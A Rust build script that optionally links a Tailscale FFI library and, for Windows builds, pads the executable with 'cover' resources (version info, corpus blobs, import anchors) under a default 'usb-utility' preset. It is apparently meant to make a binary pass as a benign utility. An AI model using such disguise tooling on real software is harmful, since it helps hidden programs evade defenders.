use std::env;
use std::path::Path;

fn main() {
    let target = env::var("TARGET").expect("Missing TARGET environment variable");

    if !target.contains("x86_64") {
        panic!("This build script only supports x86_64 targets.");
    }

    // Link the tailscale FFI Go static library only when the feature is enabled
    if cfg!(feature = "tailscale") {
        let ts_lib_dir = "/opt/tailscale_ffi";
        if Path::new(ts_lib_dir).join("libtailscale_ffi.a").exists() {
            println!("cargo:rustc-link-search=native={}", ts_lib_dir);
            println!("cargo:rustc-link-lib=static=tailscale_ffi");
            // Go runtime dependencies on Windows
            println!("cargo:rustc-link-lib=dylib=ws2_32");
            println!("cargo:rustc-link-lib=dylib=winmm");
            println!("cargo:rustc-link-lib=dylib=iphlpapi");
            println!("cargo:rustc-link-lib=dylib=ntdll");
            println!("cargo:rustc-link-lib=dylib=bcrypt");
            println!("cargo:rustc-link-lib=dylib=userenv");
            println!("cargo:rustc-link-lib=dylib=crypt32");
            println!("cargo:rustc-link-lib=dylib=ncrypt");
            println!("cargo:rustc-link-lib=dylib=ole32");
        } else {
            panic!(
                "tailscale feature enabled but libtailscale_ffi.a not found at {}",
                ts_lib_dir
            );
        }
    }

    // Compile-time PE cover fill (VERSIONINFO / corpus blobs / import anchors).
    // Ops fail policy: real corpus required; no silent synthetic filler.
    // Corpus path: BINARY_FILLER_CORPUS env, else /opt/bf-corpus (Docker image default).
    // Preset/budget: BINARY_FILLER_PRESET / BINARY_FILLER_BUDGET (set by builder.py).
    if target.contains("windows") {
        emit_binary_filler();
    }
}

fn emit_binary_filler() {
    println!("cargo:rerun-if-env-changed=BINARY_FILLER_CORPUS");
    println!("cargo:rerun-if-env-changed=BINARY_FILLER_PRESET");
    println!("cargo:rerun-if-env-changed=BINARY_FILLER_BUDGET");

    let preset = env::var("BINARY_FILLER_PRESET").unwrap_or_else(|_| "usb-utility".into());
    let corpus_fallback = "/opt/bf-corpus";

    let budget = match env::var("BINARY_FILLER_BUDGET")
        .unwrap_or_else(|_| "standard".into())
        .to_ascii_lowercase()
        .as_str()
    {
        "conservative" => binary_filler_build::Budget::conservative(),
        "aggressive" => binary_filler_build::Budget::aggressive(),
        _ => binary_filler_build::Budget::ops(),
    };

    binary_filler_build::Builder::ops()
        .cover_preset(preset)
        .corpus_from_env_or(corpus_fallback)
        .budget(budget)
        .emit()
        .expect("binary-filler emit failed (corpus missing? set BINARY_FILLER_CORPUS or install /opt/bf-corpus)");
}
